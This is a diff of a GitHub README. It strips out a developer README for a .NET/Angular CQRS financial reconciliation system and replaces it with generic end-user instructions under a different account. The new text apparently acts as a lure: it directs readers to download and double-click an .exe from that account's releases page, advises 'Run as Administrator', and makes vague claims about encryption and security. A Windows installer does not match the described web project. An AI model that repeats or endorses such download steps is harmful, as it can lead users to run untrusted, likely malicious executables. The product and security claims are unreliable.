@@ -1,261 +1,59 @@
-# 📊 FinOps Core - Financial Management and Reconciliation System
+# 📈 FinancialProject - Track your business finances with ease
 
-<p align="center">
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue?style=for-the-badge)](https://github.com/Jaynecedarn675/FinancialProject/releases)
 
-![.NET](https://img.shields.io/badge/.NET-8-512BD4?style=for-the-badge&logo=dotnet)
-![C%23](https://img.shields.io/badge/C%23-239120?style=for-the-badge&logo=csharp)
-![Angular](https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular)
-![Oracle](https://img.shields.io/badge/Oracle-F80000?style=for-the-badge&logo=oracle)
-![Entity Framework Core](https://img.shields.io/badge/EF%20Core-6DB33F?style=for-the-badge)
-![Dapper](https://img.shields.io/badge/Dapper-00599C?style=for-the-badge)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker)
-![Kubernetes](https://img.shields.io/badge/Kubernetes-326CE5?style=for-the-badge&logo=kubernetes)
-![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=for-the-badge&logo=githubactions)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+This application helps users manage financial data. It tracks records and provides reports. You use it to see your business performance. The system stores your information in a database. It ensures your numbers remain correct.
 
-</p>
+## 🛠️ System Requirements
 
-<p align="center">
+Your computer needs specific parts to run this program. Check this list before you start:
 
-![Architecture](https://img.shields.io/badge/Clean%20Architecture-✓-0A66C2?style=flat-square)
-![DDD](https://img.shields.io/badge/DDD-Domain--Driven%20Design-orange?style=flat-square)
-![CQRS](https://img.shields.io/badge/CQRS-Command%20%2F%20Query-blue?style=flat-square)
-![MediatR](https://img.shields.io/badge/MediatR-Pattern-purple?style=flat-square)
-![Result Pattern](https://img.shields.io/badge/Result-Pattern-success?style=flat-square)
-![Unit of Work](https://img.shields.io/badge/Unit%20of%20Work-Pattern-lightgrey?style=flat-square)
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Processor**: 2.0 GHz or faster.
+*   **Memory**: 8 GB RAM.
+*   **Storage**: 500 MB of free space.
+*   **Network**: A stable internet connection for database updates.
 
-</p>
+## 📥 How to Install
 
-> Corporate application developed to demonstrate advanced architectural patterns, financial data integrity, and high-performance read operations using CQRS.
+Follow these steps to set up the software on your machine:
 
----
+1. Visit the [releases page](https://github.com/Jaynecedarn675/FinancialProject/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section. 
+3. Click the file name to start the download.
+4. Open your Downloads folder once the file finishes.
+5. Double-click the file to start the installer.
+6. Follow the instructions on the screen.
+7. Click the Finish button to complete the process.
 
-# 🏛️ Architecture
+## 🚀 Getting Started
 
-The solution follows **Clean Architecture** and **Domain-Driven Design (DDD)**, keeping business rules completely isolated from infrastructure and frameworks.
+Launch the application using the icon on your desktop. The start screen shows a login prompt. Enter your credentials to view your financial dashboard. 
 
-To support scalability and high throughput, the application adopts **CQRS (Command Query Responsibility Segregation)**.
-
-## ✍️ Command Side (Write)
-
-- Entity Framework Core
-- Unit of Work
-- Rich Domain Model
-- Optimistic Concurrency
-- ACID Transactions
-- FluentValidation
-- MediatR
-
-Business operations pass through the domain layer, ensuring consistency and protecting financial transactions.
-
----
-
-## 📖 Query Side (Read)
-
-- Dapper
-- Native SQL
-- Lightweight DTOs
-- Optimized Queries
-
-Read operations bypass ORM tracking, delivering significantly faster dashboard and reporting performance.
-
----
-
-## 🧩 Design Patterns
-
-| Pattern | Purpose |
-|----------|----------|
-| ✅ Clean Architecture | Separation of concerns |
-| ✅ Domain-Driven Design | Rich business domain |
-| ✅ CQRS | Read/Write segregation |
-| ✅ Unit of Work | Transaction management |
-| ✅ Repository Pattern | Persistence abstraction |
-| ✅ MediatR | Decoupled application layer |
-| ✅ Result Pattern | Business validation without exceptions |
-| ✅ Dependency Injection | Loose coupling |
-| ✅ Idempotency | Prevent duplicate financial requests |
+The main menu appears on the left side. It lists your accounts, reports, and settings. Click on an account to see your recent transactions. You can sort these transactions by date or amount. Use the filter button to search for specific entries.
 
----
-
-# 🚀 Tech Stack
+## 📊 Using Features
 
-## Backend
+### Managing Accounts
+Create a new entry by clicking the Add button. Type the amount and select the category. Save the entry to update your total balance. The system checks your data for errors automatically.
 
-| Technology | Description |
-|------------|-------------|
-| .NET 8 | Backend |
-| C# | Programming Language |
-| Entity Framework Core | Commands |
-| Dapper | High-performance Queries |
-| MediatR | CQRS |
-| FluentValidation | Validation |
-| LINQ | Data Manipulation |
-| xUnit | Unit Tests |
-| Moq | Mocking |
+### Running Reports
+Select the Reports tab to see charts of your spending. You can view your data by month or year. The application calculates your totals for you. These reports help you track your cash flow.
 
----
+### Settings
+Adjust your display preferences in the Settings menu. You can change your password or update your profile details. Always save your changes before exiting the screen.
 
-## Frontend
+## 💡 Troubleshooting
 
-| Technology | Description |
-|------------|-------------|
-| Angular | SPA |
-| TypeScript | Language |
-| SCSS | Styling |
-| RxJS | Reactive Programming |
-| HTTP Interceptors | Authentication & Error Handling |
+Follow these steps if you have trouble with the software:
 
----
+*   **App does not open**: Right-click the icon and choose Run as Administrator.
+*   **Data appears missing**: Click the Refresh button in the top menu to update your view.
+*   **Slow performance**: Close other programs on your computer to free up memory.
+*   **Error messages**: Restart your computer if the system shows a red box with an error code.
 
-## Infrastructure
+## 🔒 Data Security
 
-| Technology | Description |
-|------------|-------------|
-| Oracle Database | Relational Database |
-| Docker | Containers |
-| Docker Compose | Local Environment |
-| Kubernetes | Deployment |
-| GitHub Actions | CI/CD |
+The software protects your information. It uses encryption to keep your records private. The database stores all changes securely. No unauthorized person can see your financial files.
 
----
-
-# 📂 Project Structure
-
-```text
-src
-├── FinancialSystem.Domain
-│   ├── Entities
-│   ├── ValueObjects
-│   ├── Enums
-│   ├── Events
-│   └── Interfaces
-│
-├── FinancialSystem.Application
-│   ├── Commands
-│   ├── Queries
-│   ├── DTOs
-│   ├── Validators
-│   └── Behaviors
-│
-├── FinancialSystem.Infrastructure
-│   ├── Persistence
-│   ├── Dapper
-│   ├── Repositories
-│   └── Services
-│
-└── FinancialSystem.API
-    ├── Controllers
-    ├── Middleware
-    ├── Filters
-    └── Configuration
-
-frontend
-└── financial-app
-
-k8s
-└── deployment
-```
-
----
-
-# ⚡ Running Locally
-
-## Requirements
-
-- Docker Desktop
-- .NET SDK 8
-- Node.js
-- Angular CLI
-
----
-
-### Clone Repository
-
-```bash
-git clone https://github.com/your-user/finops-core.git
-
-cd finops-core
-```
-
----
-
-### Start Oracle
-
-```bash
-docker compose up -d db
-```
-
----
-
-### Apply Migrations
-
-```bash
-cd src/FinancialSystem.API
-
-dotnet ef database update
-
-dotnet run
-```
-
-Swagger
-
-```
-https://localhost:5001/swagger
-```
-
----
-
-### Angular
-
-```bash
-cd frontend/financial-app
-
-npm install
-
-ng serve
-```
-
-```
-http://localhost:4200
-```
-
----
-
-# 🧪 Tests
-
-```bash
-cd src
-
-dotnet test
-```
-
----
-
-# 📈 Main Features
-
-- Financial Reconciliation
-- Cash Flow Management
-- CQRS Architecture
-- Dashboard Queries
-- High Performance Reads
-- Rich Domain Validation
-- Transaction Management
-- Optimistic Concurrency
-- Idempotent Requests
-- Unit Testing
-
----
-
-# 👨‍💻 Author
-
-**Gabriel Campos**
-
-[![GitHub](https://img.shields.io/badge/GitHub-gabrielcamposdeveloper-181717?style=for-the-badge&logo=github)](https://github.com/gabrielcamposdeveloper)
-
----
-
-# 📄 License
-
-![MIT](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-
-Licensed under the MIT License.
+Keywords: angular, dapper, docker, dot, entity-framework, fluentvalidation, kubernetes, linq, mediatr, oracle, rxjs, xunit
